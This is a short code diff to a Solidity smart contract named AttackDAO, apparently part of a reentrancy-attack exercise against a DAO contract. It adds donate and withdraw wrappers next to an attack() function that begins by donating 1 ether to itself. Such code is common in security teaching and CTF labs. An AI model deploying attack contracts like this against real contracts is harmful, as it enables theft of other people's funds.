@@ -11,6 +11,14 @@ contract AttackDAO {
     owner = msg.sender;
     dao = addr;
   }
+
+  function donate(address to, uint val) public {
+    dao.donate.value(val)(to);
+  }
+
+  function withdraw(uint amount) public {
+    dao.withdraw(amount);
+  }
   
   function attack() public {
     dao.donate.value(1 ether)(this);
